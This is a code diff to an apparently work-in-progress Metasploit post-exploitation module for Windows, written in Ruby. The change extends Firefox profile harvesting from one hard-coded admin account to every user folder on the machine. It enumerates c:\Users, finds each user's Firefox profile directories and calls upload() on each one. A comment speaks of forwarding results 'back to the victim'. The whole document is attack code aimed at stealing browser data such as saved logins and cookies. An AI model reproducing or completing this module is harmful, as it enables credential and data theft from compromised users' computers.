@@ -44,6 +44,11 @@ class MetasploitModule < Msf::Post
         print_status(" ")
     end
 
+    def find_users()
+        directory = 'c:\Users\\'
+        dirs = dir(directory)
+        return dirs
+    end
 
     def run
         # Main method
@@ -54,27 +59,38 @@ class MetasploitModule < Msf::Post
 
             if output.nil? || output.empty?
                 print_error "failed"
+                return
             else
                 print_good "#{output}"
             end
 
         else
             print_error "I am not Admin!"
+            return
         end
 
-        # Find all the Firefox profiles
-        directory = 'c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\\'
-        dirs = dir(directory)
-        if dirs.nil?
-               print_error "Something went wrong"
-        else
-               dirs.each {|a| print_status a}
-        end
+        # Get all users in Users directory except "Public"
+        users = find_users()
+        for u in users
+            if u != "." and u != ".." and u != "Public"
+                # Find all the Firefox profiles
+                directory = "c:\\Users\\#{u}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
+                print_status(directory)
+                if directory?(directory)
+                    dirs = dir(directory)
+                    if dirs.nil?
+                           print_error "Something went wrong"
+                    else
+                           dirs.each {|a| print_status a}
+                    end
 
-        for i in dirs
-            if i != "." and i != ".."
-                upload(i)
-                # Find a way to forward the response back to the victim
+                    for i in dirs
+                        if i != "." and i != ".."
+                            upload(i)
+                            # Find a way to forward the response back to the victim
+                        end
+                    end
+                end
             end
         end
 
